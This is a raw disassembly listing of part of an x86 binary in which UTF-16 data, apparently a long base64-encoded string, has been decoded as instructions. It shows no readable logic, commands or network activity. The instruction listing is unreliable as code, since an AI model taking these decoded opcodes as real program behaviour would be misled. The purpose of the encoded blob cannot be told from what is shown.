  40aedb:	00 4a 00             	add    %cl,0x0(%edx)
  40aede:	47                   	inc    %edi
  40aedf:	00 43 00             	add    %al,0x0(%ebx)
  40aee2:	46                   	inc    %esi
  40aee3:	00 6b 00             	add    %ch,0x0(%ebx)
  40aee6:	77 00                	ja     0x40aee8
  40aee8:	69 00 56 00 4d 00    	imul   $0x4d0056,(%eax),%eax
  40aeee:	49                   	dec    %ecx
  40aeef:	00 77 00             	add    %dh,0x0(%edi)
  40aef2:	79 00                	jns    0x40aef4
  40aef4:	54                   	push   %esp
  40aef5:	00 47 00             	add    %al,0x0(%edi)
  40aef8:	74 00                	je     0x40aefa
  40aefa:	78 00                	js     0x40aefc
  40aefc:	6d                   	insl   (%dx),%es:(%edi)
  40aefd:	00 42 00             	add    %al,0x0(%edx)
  40af00:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40af04:	74 00                	je     0x40af06
  40af06:	4d                   	dec    %ebp
  40af07:	00 64 00 2b          	add    %ah,0x2b(%eax,%eax,1)
  40af0b:	00 57 00             	add    %dl,0x0(%edi)
  40af0e:	46                   	inc    %esi
  40af0f:	00 51 00             	add    %dl,0x0(%ecx)
  40af12:	63 00                	arpl   %eax,(%eax)
  40af14:	45                   	inc    %ebp
  40af15:	00 32                	add    %dh,(%edx)
  40af17:	00 72 00             	add    %dh,0x0(%edx)
  40af1a:	70 00                	jo     0x40af1c
  40af1c:	39 00                	cmp    %eax,(%eax)
  40af1e:	6a 00                	push   $0x0
  40af20:	59                   	pop    %ecx
  40af21:	00 5a 00             	add    %bl,0x0(%edx)
  40af24:	68 00 78 00 6c       	push   $0x6c007800
  40af29:	00 47 00             	add    %al,0x0(%edi)
  40af2c:	78 00                	js     0x40af2e
  40af2e:	4f                   	dec    %edi
  40af2f:	00 48 00             	add    %cl,0x0(%eax)
  40af32:	32 00                	xor    (%eax),%al
  40af34:	2f                   	das
  40af35:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
  40af39:	00 73 00             	add    %dh,0x0(%ebx)
  40af3c:	4a                   	dec    %edx
  40af3d:	00 79 00             	add    %bh,0x0(%ecx)
  40af40:	62 00                	bound  %eax,(%eax)
  40af42:	33 00                	xor    (%eax),%eax
  40af44:	31 00                	xor    %eax,(%eax)
  40af46:	48                   	dec    %eax
  40af47:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  40af4b:	00 63 00             	add    %ah,0x0(%ebx)
  40af4e:	39 00                	cmp    %eax,(%eax)
  40af50:	72 00                	jb     0x40af52
  40af52:	59                   	pop    %ecx
  40af53:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  40af57:	00 45 00             	add    %al,0x0(%ebp)
  40af5a:	61                   	popa
  40af5b:	00 67 00             	add    %ah,0x0(%edi)
  40af5e:	6f                   	outsl  %ds:(%esi),(%dx)
  40af5f:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
  40af63:	00 77 00             	add    %dh,0x0(%edi)
  40af66:	50                   	push   %eax
  40af67:	00 35 00 4d 00 51    	add    %dh,0x51004d00
  40af6d:	00 39                	add    %bh,(%ecx)
  40af6f:	00 6e 00             	add    %ch,0x0(%esi)
  40af72:	4c                   	dec    %esp
  40af73:	00 63 00             	add    %ah,0x0(%ebx)
  40af76:	6c                   	insb   (%dx),%es:(%edi)
  40af77:	00 33                	add    %dh,(%ebx)
  40af79:	00 6d 00             	add    %ch,0x0(%ebp)
  40af7c:	6c                   	insb   (%dx),%es:(%edi)
  40af7d:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  40af81:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af84:	44                   	inc    %esp
  40af85:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  40af89:	00 70 00             	add    %dh,0x0(%eax)
  40af8c:	35 00 73 00 6f       	xor    $0x6f007300,%eax
  40af91:	00 52 00             	add    %dl,0x0(%edx)
  40af94:	31 00                	xor    %eax,(%eax)
  40af96:	4e                   	dec    %esi
  40af97:	00 4a 00             	add    %cl,0x0(%edx)
  40af9a:	58                   	pop    %eax
  40af9b:	00 56 00             	add    %dl,0x0(%esi)
  40af9e:	7a 00                	jp     0x40afa0
  40afa0:	79 00                	jns    0x40afa2
  40afa2:	72 00                	jb     0x40afa4
  40afa4:	52                   	push   %edx
  40afa5:	00 2f                	add    %ch,(%edi)
  40afa7:	00 4f 00             	add    %cl,0x0(%edi)
  40afaa:	4a                   	dec    %edx
  40afab:	00 31                	add    %dh,(%ecx)
  40afad:	00 4e 00             	add    %cl,0x0(%esi)
  40afb0:	77 00                	ja     0x40afb2
  40afb2:	6f                   	outsl  %ds:(%esi),(%dx)
  40afb3:	00 73 00             	add    %dh,0x0(%ebx)
  40afb6:	7a 00                	jp     0x40afb8
  40afb8:	35 00 56 00 46       	xor    $0x46005600,%eax
  40afbd:	00 50 00             	add    %dl,0x0(%eax)
  40afc0:	45                   	inc    %ebp
  40afc1:	00 2b                	add    %ch,(%ebx)
  40afc3:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40afc7:	00 68 00             	add    %ch,0x0(%eax)
  40afca:	7a 00                	jp     0x40afcc
  40afcc:	59                   	pop    %ecx
  40afcd:	00 56 00             	add    %dl,0x0(%esi)
  40afd0:	63 00                	arpl   %eax,(%eax)
  40afd2:	2b 00                	sub    (%eax),%eax
  40afd4:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40afd8:	51                   	push   %ecx
  40afd9:	00 63 00             	add    %ah,0x0(%ebx)
  40afdc:	4c                   	dec    %esp
  40afdd:	00 76 00             	add    %dh,0x0(%esi)
  40afe0:	39 00                	cmp    %eax,(%eax)
  40afe2:	5a                   	pop    %edx
  40afe3:	00 59 00             	add    %bl,0x0(%ecx)
  40afe6:	45                   	inc    %ebp
  40afe7:	00 6a 00             	add    %ch,0x0(%edx)
  40afea:	50                   	push   %eax
  40afeb:	00 4c 00 6a          	add    %cl,0x6a(%eax,%eax,1)
  40afef:	00 66 00             	add    %ah,0x0(%esi)
  40aff2:	70 00                	jo     0x40aff4
  40aff4:	31 00                	xor    %eax,(%eax)
  40aff6:	7a 00                	jp     0x40aff8
  40aff8:	68 00 42 00 48       	push   $0x48004200
  40affd:	00 2f                	add    %ch,(%edi)
  40afff:	00 79 00             	add    %bh,0x0(%ecx)
  40b002:	54                   	push   %esp
  40b003:	00 6a 00             	add    %ch,0x0(%edx)
  40b006:	79 00                	jns    0x40b008
  40b008:	63 00                	arpl   %eax,(%eax)
  40b00a:	38 00                	cmp    %al,(%eax)
  40b00c:	4f                   	dec    %edi
  40b00d:	00 4b 00             	add    %cl,0x0(%ebx)
  40b010:	4e                   	dec    %esi
  40b011:	00 74 00 37          	add    %dh,0x37(%eax,%eax,1)
  40b015:	00 55 00             	add    %dl,0x0(%ebp)
  40b018:	43                   	inc    %ebx
  40b019:	00 70 00             	add    %dh,0x0(%eax)
  40b01c:	51                   	push   %ecx
  40b01d:	00 43 00             	add    %al,0x0(%ebx)
  40b020:	4c                   	dec    %esp
  40b021:	00 79 00             	add    %bh,0x0(%ecx)
  40b024:	77 00                	ja     0x40b026
  40b026:	4a                   	dec    %edx
  40b027:	00 33                	add    %dh,(%ebx)
  40b029:	00 4d 00             	add    %cl,0x0(%ebp)
  40b02c:	6d                   	insl   (%dx),%es:(%edi)
  40b02d:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
  40b031:	00 62 00             	add    %ah,0x0(%edx)
  40b034:	5a                   	pop    %edx
  40b035:	00 69 00             	add    %ch,0x0(%ecx)
  40b038:	79 00                	jns    0x40b03a
  40b03a:	77 00                	ja     0x40b03c
  40b03c:	4c                   	dec    %esp
  40b03d:	00 59 00             	add    %bl,0x0(%ecx)
  40b040:	4f                   	dec    %edi
  40b041:	00 42 00             	add    %al,0x0(%edx)
  40b044:	45                   	inc    %ebp
  40b045:	00 36                	add    %dh,(%esi)
  40b047:	00 39                	add    %bh,(%ecx)
  40b049:	00 30                	add    %dh,(%eax)
  40b04b:	00 6d 00             	add    %ch,0x0(%ebp)
  40b04e:	56                   	push   %esi
  40b04f:	00 50 00             	add    %dl,0x0(%eax)
  40b052:	79 00                	jns    0x40b054
  40b054:	2b 00                	sub    (%eax),%eax
  40b056:	68 00 75 00 6f       	push   $0x6f007500
  40b05b:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  40b05f:	00 39                	add    %bh,(%ecx)
  40b061:	00 4d 00             	add    %cl,0x0(%ebp)
  40b064:	51                   	push   %ecx
  40b065:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40b069:	00 7a 00             	add    %bh,0x0(%edx)
  40b06c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b06d:	00 31                	add    %dh,(%ecx)
  40b06f:	00 57 00             	add    %dl,0x0(%edi)
  40b072:	61                   	popa
  40b073:	00 57 00             	add    %dl,0x0(%edi)
  40b076:	56                   	push   %esi
  40b077:	00 37                	add    %dh,(%edi)
  40b079:	00 4b 00             	add    %cl,0x0(%ebx)
  40b07c:	48                   	dec    %eax
  40b07d:	00 42 00             	add    %al,0x0(%edx)
  40b080:	6c                   	insb   (%dx),%es:(%edi)
  40b081:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b085:	00 66 00             	add    %ah,0x0(%esi)
  40b088:	4d                   	dec    %ebp
  40b089:	00 4d 00             	add    %cl,0x0(%ebp)
  40b08c:	2f                   	das
  40b08d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b090:	30 00                	xor    %al,(%eax)
  40b092:	30 00                	xor    %al,(%eax)
  40b094:	58                   	pop    %eax
  40b095:	00 5a 00             	add    %bl,0x0(%edx)
  40b098:	50                   	push   %eax
  40b099:	00 2f                	add    %ch,(%edi)
  40b09b:	00 47 00             	add    %al,0x0(%edi)
  40b09e:	47                   	inc    %edi
  40b09f:	00 5a 00             	add    %bl,0x0(%edx)
  40b0a2:	45                   	inc    %ebp
  40b0a3:	00 78 00             	add    %bh,0x0(%eax)
  40b0a6:	6c                   	insb   (%dx),%es:(%edi)
  40b0a7:	00 72 00             	add    %dh,0x0(%edx)
  40b0aa:	76 00                	jbe    0x40b0ac
  40b0ac:	70 00                	jo     0x40b0ae
  40b0ae:	77 00                	ja     0x40b0b0
  40b0b0:	55                   	push   %ebp
  40b0b1:	00 77 00             	add    %dh,0x0(%edi)
  40b0b4:	74 00                	je     0x40b0b6
  40b0b6:	4a                   	dec    %edx
  40b0b7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b0ba:	4a                   	dec    %edx
  40b0bb:	00 66 00             	add    %ah,0x0(%esi)
  40b0be:	69 00 64 00 35 00    	imul   $0x350064,(%eax),%eax
  40b0c4:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40b0c8:	53                   	push   %ebx
  40b0c9:	00 4f 00             	add    %cl,0x0(%edi)
  40b0cc:	74 00                	je     0x40b0ce
  40b0ce:	4d                   	dec    %ebp
  40b0cf:	00 4b 00             	add    %cl,0x0(%ebx)
  40b0d2:	53                   	push   %ebx
  40b0d3:	00 7a 00             	add    %bh,0x0(%edx)
  40b0d6:	32 00                	xor    (%eax),%al
  40b0d8:	34 00                	xor    $0x0,%al
  40b0da:	46                   	inc    %esi
  40b0db:	00 71 00             	add    %dh,0x0(%ecx)
  40b0de:	74 00                	je     0x40b0e0
  40b0e0:	73 00                	jae    0x40b0e2
  40b0e2:	38 00                	cmp    %al,(%eax)
  40b0e4:	2b 00                	sub    (%eax),%eax
  40b0e6:	39 00                	cmp    %eax,(%eax)
  40b0e8:	62 00                	bound  %eax,(%eax)
  40b0ea:	45                   	inc    %ebp
  40b0eb:	00 33                	add    %dh,(%ebx)
  40b0ed:	00 7a 00             	add    %bh,0x0(%edx)
  40b0f0:	68 00 49 00 57       	push   $0x57004900
  40b0f5:	00 46 00             	add    %al,0x0(%esi)
  40b0f8:	2b 00                	sub    (%eax),%eax
  40b0fa:	58                   	pop    %eax
  40b0fb:	00 42 00             	add    %al,0x0(%edx)
  40b0fe:	5a                   	pop    %edx
  40b0ff:	00 67 00             	add    %ah,0x0(%edi)
  40b102:	73 00                	jae    0x40b104
  40b104:	78 00                	js     0x40b106
  40b106:	6f                   	outsl  %ds:(%esi),(%dx)
  40b107:	00 62 00             	add    %ah,0x0(%edx)
  40b10a:	53                   	push   %ebx
  40b10b:	00 77 00             	add    %dh,0x0(%edi)
  40b10e:	4d                   	dec    %ebp
  40b10f:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40b113:	00 58 00             	add    %bl,0x0(%eax)
  40b116:	4b                   	dec    %ebx
  40b117:	00 72 00             	add    %dh,0x0(%edx)
  40b11a:	4f                   	dec    %edi
  40b11b:	00 41 00             	add    %al,0x0(%ecx)
  40b11e:	6d                   	insl   (%dx),%es:(%edi)
  40b11f:	00 46 00             	add    %al,0x0(%esi)
  40b122:	39 00                	cmp    %eax,(%eax)
  40b124:	4d                   	dec    %ebp
  40b125:	00 70 00             	add    %dh,0x0(%eax)
  40b128:	50                   	push   %eax
  40b129:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40b12d:	00 7a 00             	add    %bh,0x0(%edx)
  40b130:	35 00 61 00 2b       	xor    $0x2b006100,%eax
  40b135:	00 50 00             	add    %dl,0x0(%eax)
  40b138:	32 00                	xor    (%eax),%al
  40b13a:	65 00 6c 00 58       	add    %ch,%gs:0x58(%eax,%eax,1)
  40b13f:	00 59 00             	add    %bl,0x0(%ecx)
  40b142:	4a                   	dec    %edx
  40b143:	00 57 00             	add    %dl,0x0(%edi)
  40b146:	33 00                	xor    (%eax),%eax
  40b148:	41                   	inc    %ecx
  40b149:	00 2b                	add    %ch,(%ebx)
  40b14b:	00 53 00             	add    %dl,0x0(%ebx)
  40b14e:	34 00                	xor    $0x0,%al
  40b150:	73 00                	jae    0x40b152
  40b152:	62 00                	bound  %eax,(%eax)
  40b154:	55                   	push   %ebp
  40b155:	00 4a 00             	add    %cl,0x0(%edx)
  40b158:	67 00 6c 00          	add    %ch,0x0(%si)
  40b15c:	33 00                	xor    (%eax),%eax
  40b15e:	76 00                	jbe    0x40b160
  40b160:	6e                   	outsb  %ds:(%esi),(%dx)
  40b161:	00 6b 00             	add    %ch,0x0(%ebx)
  40b164:	38 00                	cmp    %al,(%eax)
  40b166:	49                   	dec    %ecx
  40b167:	00 7a 00             	add    %bh,0x0(%edx)
  40b16a:	77 00                	ja     0x40b16c
  40b16c:	46                   	inc    %esi
  40b16d:	00 31                	add    %dh,(%ecx)
  40b16f:	00 2b                	add    %ch,(%ebx)
  40b171:	00 68 00             	add    %ch,0x0(%eax)
  40b174:	51                   	push   %ecx
  40b175:	00 31                	add    %dh,(%ecx)
  40b177:	00 58 00             	add    %bl,0x0(%eax)
  40b17a:	62 00                	bound  %eax,(%eax)
  40b17c:	64 00 35 00 73 00 7a 	add    %dh,%fs:0x7a007300
  40b183:	00 32                	add    %dh,(%edx)
  40b185:	00 77 00             	add    %dh,0x0(%edi)
  40b188:	7a 00                	jp     0x40b18a
  40b18a:	79 00                	jns    0x40b18c
  40b18c:	70 00                	jo     0x40b18e
  40b18e:	38 00                	cmp    %al,(%eax)
  40b190:	2f                   	das
  40b191:	00 51 00             	add    %dl,0x0(%ecx)
  40b194:	55                   	push   %ebp
  40b195:	00 6f 00             	add    %ch,0x0(%edi)
  40b198:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40b19c:	4a                   	dec    %edx
  40b19d:	00 36                	add    %dh,(%esi)
  40b19f:	00 4f 00             	add    %cl,0x0(%edi)
  40b1a2:	51                   	push   %ecx
  40b1a3:	00 66 00             	add    %ah,0x0(%esi)
  40b1a6:	34 00                	xor    $0x0,%al
  40b1a8:	4a                   	dec    %edx
  40b1a9:	00 52 00             	add    %dl,0x0(%edx)
  40b1ac:	70 00                	jo     0x40b1ae
  40b1ae:	2b 00                	sub    (%eax),%eax
  40b1b0:	68 00 35 00 62       	push   $0x62003500
  40b1b5:	00 67 00             	add    %ah,0x0(%edi)
  40b1b8:	79 00                	jns    0x40b1ba
  40b1ba:	6a 00                	push   $0x0
  40b1bc:	78 00                	js     0x40b1be
  40b1be:	30 00                	xor    %al,(%eax)
  40b1c0:	72 00                	jb     0x40b1c2
  40b1c2:	78 00                	js     0x40b1c4
  40b1c4:	38 00                	cmp    %al,(%eax)
  40b1c6:	45                   	inc    %ebp
  40b1c7:	00 47 00             	add    %al,0x0(%edi)
  40b1ca:	72 00                	jb     0x40b1cc
  40b1cc:	63 00                	arpl   %eax,(%eax)
  40b1ce:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40b1d2:	41                   	inc    %ecx
  40b1d3:	00 2b                	add    %ch,(%ebx)
  40b1d5:	00 61 00             	add    %ah,0x0(%ecx)
  40b1d8:	72 00                	jb     0x40b1da
  40b1da:	30 00                	xor    %al,(%eax)
  40b1dc:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  40b1e0:	68 00 50 00 63       	push   $0x63005000
  40b1e5:	00 5a 00             	add    %bl,0x0(%edx)
  40b1e8:	4e                   	dec    %esi
  40b1e9:	00 67 00             	add    %ah,0x0(%edi)
  40b1ec:	61                   	popa
  40b1ed:	00 39                	add    %bh,(%ecx)
  40b1ef:	00 66 00             	add    %ah,0x0(%esi)
  40b1f2:	71 00                	jno    0x40b1f4
  40b1f4:	46                   	inc    %esi
  40b1f5:	00 4b 00             	add    %cl,0x0(%ebx)
  40b1f8:	37                   	aaa
  40b1f9:	00 47 00             	add    %al,0x0(%edi)
  40b1fc:	73 00                	jae    0x40b1fe
  40b1fe:	39 00                	cmp    %eax,(%eax)
  40b200:	4a                   	dec    %edx
  40b201:	00 6f 00             	add    %ch,0x0(%edi)
  40b204:	4a                   	dec    %edx
  40b205:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b208:	38 00                	cmp    %al,(%eax)
  40b20a:	69 00 61 00 4e 00    	imul   $0x4e0061,(%eax),%eax
  40b210:	38 00                	cmp    %al,(%eax)
  40b212:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  40b216:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40b21a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b21b:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  40b21f:	00 70 00             	add    %dh,0x0(%eax)
  40b222:	49                   	dec    %ecx
  40b223:	00 62 00             	add    %ah,0x0(%edx)
  40b226:	33 00                	xor    (%eax),%eax
  40b228:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40b22c:	4d                   	dec    %ebp
  40b22d:	00 73 00             	add    %dh,0x0(%ebx)
  40b230:	4a                   	dec    %edx
  40b231:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  40b235:	00 31                	add    %dh,(%ecx)
  40b237:	00 78 00             	add    %bh,0x0(%eax)
  40b23a:	4d                   	dec    %ebp
  40b23b:	00 51 00             	add    %dl,0x0(%ecx)
  40b23e:	4f                   	dec    %edi
  40b23f:	00 2b                	add    %ch,(%ebx)
  40b241:	00 7a 00             	add    %bh,0x0(%edx)
  40b244:	37                   	aaa
  40b245:	00 2b                	add    %ch,(%ebx)
  40b247:	00 6d 00             	add    %ch,0x0(%ebp)
  40b24a:	53                   	push   %ebx
  40b24b:	00 71 00             	add    %dh,0x0(%ecx)
  40b24e:	57                   	push   %edi
  40b24f:	00 45 00             	add    %al,0x0(%ebp)
  40b252:	48                   	dec    %eax
  40b253:	00 4d 00             	add    %cl,0x0(%ebp)
  40b256:	76 00                	jbe    0x40b258
  40b258:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40b25c:	53                   	push   %ebx
  40b25d:	00 32                	add    %dh,(%edx)
  40b25f:	00 56 00             	add    %dl,0x0(%esi)
  40b262:	63 00                	arpl   %eax,(%eax)
  40b264:	62 00                	bound  %eax,(%eax)
  40b266:	38 00                	cmp    %al,(%eax)
  40b268:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40b26c:	56                   	push   %esi
  40b26d:	00 55 00             	add    %dl,0x0(%ebp)
  40b270:	71 00                	jno    0x40b272
  40b272:	48                   	dec    %eax
  40b273:	00 41 00             	add    %al,0x0(%ecx)
  40b276:	61                   	popa
  40b277:	00 72 00             	add    %dh,0x0(%edx)
  40b27a:	54                   	push   %esp
  40b27b:	00 32                	add    %dh,(%edx)
  40b27d:	00 38                	add    %bh,(%eax)
  40b27f:	00 43 00             	add    %al,0x0(%ebx)
  40b282:	2f                   	das
  40b283:	00 58 00             	add    %bl,0x0(%eax)
  40b286:	34 00                	xor    $0x0,%al
  40b288:	39 00                	cmp    %eax,(%eax)
  40b28a:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  40b28e:	63 00                	arpl   %eax,(%eax)
  40b290:	48                   	dec    %eax
  40b291:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40b295:	00 36                	add    %dh,(%esi)
  40b297:	00 45 00             	add    %al,0x0(%ebp)
  40b29a:	63 00                	arpl   %eax,(%eax)
  40b29c:	4d                   	dec    %ebp
  40b29d:	00 4b 00             	add    %cl,0x0(%ebx)
  40b2a0:	6c                   	insb   (%dx),%es:(%edi)
  40b2a1:	00 55 00             	add    %dl,0x0(%ebp)
  40b2a4:	2f                   	das
  40b2a5:	00 4e 00             	add    %cl,0x0(%esi)
  40b2a8:	76 00                	jbe    0x40b2aa
  40b2aa:	6d                   	insl   (%dx),%es:(%edi)
  40b2ab:	00 4b 00             	add    %cl,0x0(%ebx)
  40b2ae:	72 00                	jb     0x40b2b0
  40b2b0:	39 00                	cmp    %eax,(%eax)
  40b2b2:	79 00                	jns    0x40b2b4
  40b2b4:	75 00                	jne    0x40b2b6
  40b2b6:	69 00 35 00 6e 00    	imul   $0x6e0035,(%eax),%eax
  40b2bc:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2bd:	00 72 00             	add    %dh,0x0(%edx)
  40b2c0:	39 00                	cmp    %eax,(%eax)
  40b2c2:	30 00                	xor    %al,(%eax)
  40b2c4:	32 00                	xor    (%eax),%al
  40b2c6:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40b2ca:	59                   	pop    %ecx
  40b2cb:	00 4e 00             	add    %cl,0x0(%esi)
  40b2ce:	57                   	push   %edi
  40b2cf:	00 4f 00             	add    %cl,0x0(%edi)
  40b2d2:	4c                   	dec    %esp
  40b2d3:	00 72 00             	add    %dh,0x0(%edx)
  40b2d6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2d7:	00 62 00             	add    %ah,0x0(%edx)
  40b2da:	32 00                	xor    (%eax),%al
  40b2dc:	54                   	push   %esp
  40b2dd:	00 4e 00             	add    %cl,0x0(%esi)
  40b2e0:	51                   	push   %ecx
  40b2e1:	00 75 00             	add    %dh,0x0(%ebp)
  40b2e4:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40b2e7:	00 47 00             	add    %al,0x0(%edi)
  40b2ea:	58                   	pop    %eax
  40b2eb:	00 57 00             	add    %dl,0x0(%edi)
  40b2ee:	43                   	inc    %ebx
  40b2ef:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b2f2:	35 00 49 00 7a       	xor    $0x7a004900,%eax
  40b2f7:	00 4d 00             	add    %cl,0x0(%ebp)
  40b2fa:	34 00                	xor    $0x0,%al
  40b2fc:	45                   	inc    %ebp
  40b2fd:	00 59 00             	add    %bl,0x0(%ecx)
  40b300:	73 00                	jae    0x40b302
  40b302:	4b                   	dec    %ebx
  40b303:	00 45 00             	add    %al,0x0(%ebp)
  40b306:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  40b30a:	42                   	inc    %edx
  40b30b:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40b30f:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40b313:	00 47 00             	add    %al,0x0(%edi)
  40b316:	4f                   	dec    %edi
  40b317:	00 78 00             	add    %bh,0x0(%eax)
  40b31a:	44                   	inc    %esp
  40b31b:	00 58 00             	add    %bl,0x0(%eax)
  40b31e:	6d                   	insl   (%dx),%es:(%edi)
  40b31f:	00 52 00             	add    %dl,0x0(%edx)
  40b322:	64 00 38             	add    %bh,%fs:(%eax)
  40b325:	00 39                	add    %bh,(%ecx)
  40b327:	00 47 00             	add    %al,0x0(%edi)
  40b32a:	44                   	inc    %esp
  40b32b:	00 36                	add    %dh,(%esi)
  40b32d:	00 41 00             	add    %al,0x0(%ecx)
  40b330:	6e                   	outsb  %ds:(%esi),(%dx)
  40b331:	00 46 00             	add    %al,0x0(%esi)
  40b334:	4b                   	dec    %ebx
  40b335:	00 70 00             	add    %dh,0x0(%eax)
  40b338:	55                   	push   %ebp
  40b339:	00 36                	add    %dh,(%esi)
  40b33b:	00 2b                	add    %ch,(%ebx)
  40b33d:	00 65 00             	add    %ah,0x0(%ebp)
  40b340:	50                   	push   %eax
  40b341:	00 30                	add    %dh,(%eax)
  40b343:	00 30                	add    %dh,(%eax)
  40b345:	00 49 00             	add    %cl,0x0(%ecx)
  40b348:	7a 00                	jp     0x40b34a
  40b34a:	38 00                	cmp    %al,(%eax)
  40b34c:	49                   	dec    %ecx
  40b34d:	00 38                	add    %bh,(%eax)
  40b34f:	00 56 00             	add    %dl,0x0(%esi)
  40b352:	4b                   	dec    %ebx
  40b353:	00 45 00             	add    %al,0x0(%ebp)
  40b356:	52                   	push   %edx
  40b357:	00 2b                	add    %ch,(%ebx)
  40b359:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b35c:	43                   	inc    %ebx
  40b35d:	00 4b 00             	add    %cl,0x0(%ebx)
  40b360:	6f                   	outsl  %ds:(%esi),(%dx)
  40b361:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  40b365:	00 2b                	add    %ch,(%ebx)
  40b367:	00 33                	add    %dh,(%ebx)
  40b369:	00 61 00             	add    %ah,0x0(%ecx)
  40b36c:	71 00                	jno    0x40b36e
  40b36e:	49                   	dec    %ecx
  40b36f:	00 42 00             	add    %al,0x0(%edx)
  40b372:	58                   	pop    %eax
  40b373:	00 4e 00             	add    %cl,0x0(%esi)
  40b376:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40b37a:	43                   	inc    %ebx
  40b37b:	00 45 00             	add    %al,0x0(%ebp)
  40b37e:	74 00                	je     0x40b380
  40b380:	76 00                	jbe    0x40b382
  40b382:	32 00                	xor    (%eax),%al
  40b384:	47                   	inc    %edi
  40b385:	00 47 00             	add    %al,0x0(%edi)
  40b388:	79 00                	jns    0x40b38a
  40b38a:	6a 00                	push   $0x0
  40b38c:	45                   	inc    %ebp
  40b38d:	00 57 00             	add    %dl,0x0(%edi)
  40b390:	54                   	push   %esp
  40b391:	00 65 00             	add    %ah,0x0(%ebp)
  40b394:	4b                   	dec    %ebx
  40b395:	00 54 00 66          	add    %dl,0x66(%eax,%eax,1)
  40b399:	00 70 00             	add    %dh,0x0(%eax)
  40b39c:	6c                   	insb   (%dx),%es:(%edi)
  40b39d:	00 51 00             	add    %dl,0x0(%ecx)
  40b3a0:	41                   	inc    %ecx
  40b3a1:	00 6a 00             	add    %ch,0x0(%edx)
  40b3a4:	41                   	inc    %ecx
  40b3a5:	00 2f                	add    %ch,(%edi)
  40b3a7:	00 2b                	add    %ch,(%ebx)
  40b3a9:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40b3ad:	00 46 00             	add    %al,0x0(%esi)
  40b3b0:	7a 00                	jp     0x40b3b2
  40b3b2:	34 00                	xor    $0x0,%al
  40b3b4:	39 00                	cmp    %eax,(%eax)
  40b3b6:	57                   	push   %edi
  40b3b7:	00 6f 00             	add    %ch,0x0(%edi)
  40b3ba:	63 00                	arpl   %eax,(%eax)
  40b3bc:	78 00                	js     0x40b3be
  40b3be:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3bf:	00 4b 00             	add    %cl,0x0(%ebx)
  40b3c2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3c3:	00 37                	add    %dh,(%edi)
  40b3c5:	00 4a 00             	add    %cl,0x0(%edx)
  40b3c8:	72 00                	jb     0x40b3ca
  40b3ca:	35 00 78 00 31       	xor    $0x31007800,%eax
  40b3cf:	00 54 00 6d          	add    %dl,0x6d(%eax,%eax,1)
  40b3d3:	00 59 00             	add    %bl,0x0(%ecx)
  40b3d6:	31 00                	xor    %eax,(%eax)
  40b3d8:	61                   	popa
  40b3d9:	00 5a 00             	add    %bl,0x0(%edx)
  40b3dc:	7a 00                	jp     0x40b3de
  40b3de:	34 00                	xor    $0x0,%al
  40b3e0:	32 00                	xor    (%eax),%al
  40b3e2:	45                   	inc    %ebp
  40b3e3:	00 6b 00             	add    %ch,0x0(%ebx)
  40b3e6:	6a 00                	push   $0x0
  40b3e8:	33 00                	xor    (%eax),%eax
  40b3ea:	37                   	aaa
  40b3eb:	00 4b 00             	add    %cl,0x0(%ebx)
  40b3ee:	42                   	inc    %edx
  40b3ef:	00 76 00             	add    %dh,0x0(%esi)
  40b3f2:	4d                   	dec    %ebp
  40b3f3:	00 42 00             	add    %al,0x0(%edx)
  40b3f6:	72 00                	jb     0x40b3f8
  40b3f8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3f9:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  40b3fd:	00 55 00             	add    %dl,0x0(%ebp)
  40b400:	5a                   	pop    %edx
  40b401:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
  40b405:	00 6d 00             	add    %ch,0x0(%ebp)
  40b408:	5a                   	pop    %edx
  40b409:	00 5a 00             	add    %bl,0x0(%edx)
  40b40c:	76 00                	jbe    0x40b40e
  40b40e:	73 00                	jae    0x40b410
  40b410:	7a 00                	jp     0x40b412
  40b412:	4c                   	dec    %esp
